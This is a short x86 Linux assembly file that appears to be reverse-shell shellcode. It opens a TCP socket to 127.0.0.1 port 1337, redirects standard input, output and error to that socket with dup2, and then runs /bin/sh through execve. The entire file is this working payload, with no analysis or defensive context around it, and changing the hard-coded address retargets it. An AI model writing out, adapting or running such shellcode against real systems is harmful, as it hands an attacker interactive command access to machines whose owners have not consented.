section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    xor eax, eax
    push eax
    push byte 1          ; SOCK_STREAM
    push byte 2          ; AF_INET
    mov al, 102          ; sys_socketcall
    mov ebx, 1           ; SYS_SOCKET
    mov ecx, esp
    int 0x80

    mov esi, eax         ; save socket fd

    ; connect(fd, sockaddr*, 16)
    push dword 0x0100007F  ; IP = 127.0.0.1
    push word 0x3905        ; port = 1337 (0x0539) in little endian
    push word 2             ; AF_INET
    mov ecx, esp

    push byte 16            ; addrlen
    push ecx                ; sockaddr*
    push esi                ; sockfd
    mov al, 102
    mov ebx, 3              ; SYS_CONNECT
    mov ecx, esp
    int 0x80

    ; dup2 loop: stdin, stdout, stderr = socket fd
    xor ecx, ecx
.next:
    mov eax, 63             ; sys_dup2
    mov ebx, esi
    int 0x80
    inc ecx
    cmp ecx, 3
    jl .next

    ; execve("/bin/sh", NULL, NULL)
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11              ; sys_execve
    int 0x80
